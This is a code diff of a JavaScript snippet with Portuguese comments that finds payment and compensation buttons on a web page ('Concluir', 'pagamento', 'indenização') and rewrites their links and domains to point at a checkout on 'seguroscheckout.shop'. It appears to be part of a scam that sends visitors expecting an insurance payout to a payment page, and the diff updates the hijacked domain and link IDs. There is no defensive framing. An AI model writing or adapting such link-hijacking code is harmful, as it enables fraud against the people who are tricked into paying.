@@ -22,7 +22,7 @@
 (function() {
     const oldLink = 'https://pay.seguroscheckout.shop/VroegN1RNryGKwj';
     const newLink = 'https://pay.seguroscheckout.shop/VroegN1RNryGKwj';
-    const oldDomain = 'confirmacao-dopagamento.com';
+    const oldDomain = 'seguroscheckout.shop';
     const newDomain = 'seguroscheckout.shop';
     const buttonKeywords = ['Concluir', 'pagamento', 'receber', 'indenização', 'indenizacao'];
     
@@ -35,7 +35,7 @@
                 // log removido
                 return obj.replace(new RegExp(oldLink.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newLink)
                           .replace(new RegExp(oldDomain.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newDomain)
-                          .replace(/5pjw3Rn54Ya32lQ/g, 'z0qn35dlmD1g98m');
+                          .replace(/5pjw3Rn54Ya32lQ/g, 'VroegN1RNryGKwj');
             }
             return obj;
         }
@@ -205,7 +205,7 @@
                                 const href = el.getAttribute('href') || el.getAttribute('data-href');
                                 
                                 // Modifica links antigos
-                                if (href && (href.includes('confirmacao-dopagamento.com') || href.includes('5pjw3Rn54Ya32lQ'))) {
+                                if (href && (href.includes('confirmacao-dopagamento.com') || href.includes('VroegN1RNryGKwj'))) {
                                     // log removido
                                     if (el.getAttribute('href')) {
                                         el.setAttribute('href', newLink);
